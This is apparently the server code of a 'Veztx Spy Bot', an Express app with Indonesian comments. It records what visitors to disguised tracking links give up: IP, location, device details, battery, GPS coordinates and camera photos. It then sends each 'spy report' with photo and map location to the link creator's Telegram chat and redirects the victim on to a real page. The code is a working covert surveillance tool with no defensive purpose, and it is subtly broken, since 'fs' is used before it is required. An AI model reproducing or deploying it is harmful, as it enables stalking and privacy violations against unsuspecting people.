const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

// ==================== KONFIGURASI ====================
const SPY_LINKS_FILE = './database/spy_links.json';
const TEMPLATE_FILE = './database/templates.json';
const SHORT_LINKS_FILE = './database/short_links.json';
const CAPTURES_FILE = './database/captures.json';

// Buat folder database (kalau di Vercel ini cuma buat local)
if (!fs.existsSync('./database')) fs.mkdirSync('./database');
if (!fs.existsSync(SPY_LINKS_FILE)) fs.writeFileSync(SPY_LINKS_FILE, JSON.stringify({}));
if (!fs.existsSync(TEMPLATE_FILE)) fs.writeFileSync(TEMPLATE_FILE, JSON.stringify({}));
if (!fs.existsSync(SHORT_LINKS_FILE)) fs.writeFileSync(SHORT_LINKS_FILE, JSON.stringify({}));
if (!fs.existsSync(CAPTURES_FILE)) fs.writeFileSync(CAPTURES_FILE, JSON.stringify({}));

// ==================== FUNGSI BACA/TULIS FILE (FALLBACK) ====================
const fs = require('fs');

// ==================== FORMAT SPY REPORT ====================
const formatSpyReport = (data) => {
  let report = `🔍 SPY REPORT — ${data.type || '📸 Photo & Lokasi'}\n`;
  report += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  report += `📡 JARINGAN\n`;
  report += `├ IP       : ${data.ip || 'Tidak diketahui'}\n`;
  report += `├ Negara   : ${data.country || 'Tidak diketahui'}\n`;
  report += `├ Kota     : ${data.city || 'Tidak diketahui'}\n`;
  report += `├ Wilayah  : ${data.region || 'Tidak diketahui'}\n`;
  report += `└ ISP      : ${data.isp || 'Tidak diketahui'}\n\n`;
  
  report += `📱 PERANGKAT\n`;
  report += `├ Browser  : ${data.browser || 'Tidak diketahui'}\n`;
  report += `├ Engine   : ${data.engine || 'Tidak diketahui'}\n`;
  report += `├ OS       : ${data.os || 'Tidak diketahui'}\n`;
  report += `├ Device   : ${data.device || 'Tidak diketahui'}\n`;
  report += `├ RAM      : ${data.ram || '~8 GB (perkiraan)'}\n`;
  report += `└ Baterai  : ${data.battery || 'Tidak diketahui'}\n\n`;
  
  if (data.lat && data.lng) {
    report += `📍 LOKASI GPS\n`;
    report += `├ Koordinat: ${data.lat}, ${data.lng}\n`;
    report += `└ Akurasi  : ${data.accuracy || 'Tidak diketahui'}\n\n`;
  }
  
  report += `🌐 SESI\n`;
  if (data.fromUrl) {
    report += `├ Dari URL : ${data.fromUrl}\n`;
  }
  report += `└ UA       : ${data.userAgent || 'Tidak diketahui'}\n`;
  
  if (data.photoStatus) {
    report += `\n📷 ${data.photoStatus}`;
  } else if (data.photo) {
    report += `\n📷 Foto berhasil diambil ✅`;
  } else {
    report += `\n📷 Kamera ditolak/gagal`;
  }
  
  if (data.lat && data.lng) {
    report += `\n\n🗺️ Maps: https://www.google.co.id/maps/place/${data.lat},${data.lng}`;
  }
  
  return report;
};

// ==================== FUNGSI SAVE CAPTURE ====================
const saveCapture = async (shortCode, type, data) => {
  try {
    // Coba baca dari file lokal
    let captures = {};
    try {
      captures = JSON.parse(fs.readFileSync(CAPTURES_FILE, 'utf8'));
    } catch (e) {
      captures = {};
    }
    
    if (!captures[shortCode]) {
      captures[shortCode] = [];
    }
    
    captures[shortCode].push({
      type: type,
      data: data,
      timestamp: Date.now()
    });
    
    fs.writeFileSync(CAPTURES_FILE, JSON.stringify(captures, null, 2));
  } catch (err) {
    console.error('Save capture error:', err.message);
  }
  
  // Kirim ke bot via Telegram API
  try {
    const botToken = process.env.TokenS;
    const githubToken = process.env.githubToken;
    const githubRepo2 = process.env.githubRepo2;
    const allUsersPath = process.env.allUsersPath;
    
    let userId = null;
    let linkData = null;
    
    // Coba cari dari file lokal
    try {
      if (type === 'spy') {
        const spyData = JSON.parse(fs.readFileSync(SPY_LINKS_FILE, 'utf8'));
        if (spyData[shortCode]) {
          linkData = spyData[shortCode];
          userId = linkData.userId;
        }
      } else if (type === 'template') {
        const templateData = JSON.parse(fs.readFileSync(TEMPLATE_FILE, 'utf8'));
        if (templateData[shortCode]) {
          linkData = templateData[shortCode];
          userId = linkData.userId;
        }
      }
    } catch (e) {
      console.error('Read link data error:', e.message);
    }
    
    // KALAU GAK DAPET DARI FILE, COBA DARI GITHUB
    if (!userId && githubToken && githubRepo2 && allUsersPath) {
      try {
        const url = `https://api.github.com/repos/${githubRepo2}/contents/${allUsersPath}`;
        const res = await axios.get(url, {
          headers: { Authorization: `token ${githubToken}` }
        });
        const content = Buffer.from(res.data.content, 'base64').toString();
        const usersData = JSON.parse(content);
        
        // Cari user yang punya shortCode ini
        for (let id in usersData.users) {
          const user = usersData.users[id];
          if (user.links) {
            const link = user.links.find(l => l.shortCode === shortCode);
            if (link) {
              userId = id;
              break;
            }
          }
        }
      } catch (e) {
        console.error('GitHub fetch error:', e.message);
      }
    }
    
    if (userId && botToken) {
      const reportText = formatSpyReport(data);
      
      // Kirim report via Telegram
      if (data.photo) {
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: userId,
            photo: data.photo,
            caption: reportText,
            parse_mode: 'Markdown'
          })
        });
      } else {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: userId,
            text: reportText,
            parse_mode: 'Markdown'
          })
        });
      }
      
      if (data.lat && data.lng) {
        await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: userId,
            latitude: data.lat,
            longitude: data.lng
          })
        });
      }
    }
  } catch (err) {
    console.error('Gagal kirim notifikasi:', err.message);
  }
  
  return true;
};

// ==================== ENDPOINT CAPTURE ====================
app.post('/api/capture', async (req, res) => {
  try {
    const { shortCode, type, data } = req.body;
    
    if (!shortCode || !data) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    
    await saveCapture(shortCode, type, data);
    res.json({ success: true });
  } catch (err) {
    console.error('Capture error:', err);
    res.status(500).json({ error: err.message });
  }
});

// ==================== ENDPOINT REDIRECT ====================
app.get('/s/:code', async (req, res) => {
  const { code } = req.params;
  
  try {
    const spyData = JSON.parse(fs.readFileSync(SPY_LINKS_FILE, 'utf8'));
    
    if (spyData[code] && spyData[code].active) {
      spyData[code].clicks = (spyData[code].clicks || 0) + 1;
      fs.writeFileSync(SPY_LINKS_FILE, JSON.stringify(spyData, null, 2));
      return res.redirect(spyData[code].originalUrl);
    }
  } catch (err) {
    console.error('Redirect error:', err);
  }
  
  res.status(404).send('Link tidak ditemukan');
});

app.get('/t/:code', async (req, res) => {
  const { code } = req.params;
  
  try {
    const templateData = JSON.parse(fs.readFileSync(TEMPLATE_FILE, 'utf8'));
    
    if (templateData[code] && templateData[code].active) {
      return res.redirect(templateData[code].targetUrl);
    }
  } catch (err) {
    console.error('Redirect error:', err);
  }
  
  res.status(404).send('Template tidak ditemukan');
});

app.get('/sh/:code', async (req, res) => {
  const { code } = req.params;
  
  try {
    const shortData = JSON.parse(fs.readFileSync(SHORT_LINKS_FILE, 'utf8'));
    
    if (shortData[code]) {
      return res.redirect(shortData[code].originalUrl);
    }
  } catch (err) {
    console.error('Redirect error:', err);
  }
  
  res.status(404).send('Short URL tidak ditemukan');
});

app.get('/', (req, res) => {
  res.send(`
    <html>
      <head><title>Veztx Spy Bot</title></head>
      <body>
        <h1>Veztx Spy Bot</h1>
        <p>Active endpoints:</p>
        <ul>
          <li>/api/capture - Capture endpoint</li>
          <li>/s/:code - Spy link redirect</li>
          <li>/t/:code - Template link redirect</li>
          <li>/sh/:code - Short URL redirect</li>
        </ul>
      </body>
    </html>
  `);
});

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🌐 Server running on port ${PORT}`);
});

module.exports = app;